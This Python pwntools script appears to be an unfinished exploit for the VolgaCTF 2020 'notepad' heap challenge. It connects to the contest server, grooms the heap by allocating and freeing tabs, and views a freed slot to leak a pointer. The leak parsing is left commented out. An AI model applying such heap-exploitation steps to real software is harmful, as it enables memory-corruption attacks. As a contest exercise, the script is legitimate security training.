from pwn import *

#r = process('./notepad')
r = remote('notepad.q.2020.volgactf.ru',45678)
# notebook functionalities
def add_note(name):
	r.sendlineafter('>','a')
	r.sendlineafter('name: ',name)

def pick_note(): #display items
	r.sendlineafter('>','l')

def dele_note(idx):
	r.sendlineafter('>','d')
	r.sendlineafter('Enter index of a notebook to delete:',str(idx))

def pick_note(idx):
	r.sendlineafter('>','p')
	r.sendlineafter('pick: ',str(idx))

#tab functionalities
def add_tab(name,length,data):
	r.sendlineafter('>','a')
	r.sendlineafter('name: ',name)
	r.sendlineafter('Enter data length (in bytes): ',str(length))
	r.sendlineafter('data: ',data)

def view_tab(idx):
	r.sendlineafter('>','v')
	r.sendlineafter('view: ',str(idx))

def list_tab():
	r.sendlineafter('>','l')

def update_tab(idx,name,length,data):
	r.sendlineafter('>','u')
	r.sendlineafter('update: ',str(idx))
	r.sendlineafter('skip): ',name)
	r.sendlineafter('same): ',str(length))
	r.sendlineafter('data: ',data)

def del_tab(idx):
	r.sendlineafter('>','d')
	r.sendlineafter('delete: ',str(idx))

add_note('a'*16)
pick_note(1)
add_tab('b'*10,0x20,'b'*0x10)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('c'*10,0x100,'c'*0x8)
add_tab('d'*10,0x80,'d'*0x8)
del_tab(2)
del_tab(3)
del_tab(4)
del_tab(5)
del_tab(6)
del_tab(7)
del_tab(8)
del_tab(9)
add_tab('z'*10,0x100,'d'*0x7)
add_tab('z'*10,0x100,'d'*0x7)
add_tab('z'*10,0x100,'d'*0x7)
add_tab('z'*10,0x100,'d'*0x7)
add_tab('z'*10,0x100,'d'*0x7)
add_tab('z'*10,0x100,'d'*0x7)
add_tab('z'*10,0x100,'d'*0x7)
add_tab('y'*10,0x100,'d'*0x7)


#add_tab('b'*10,0x100,'c'*0x8)

#gdb.attach(r,'b * puts')
view_tab(14)
#print(r.recvline())
#print(r.recvline())
#leak = u64(r.recvline()[:8])
#print(hex(leak))
r.interactive()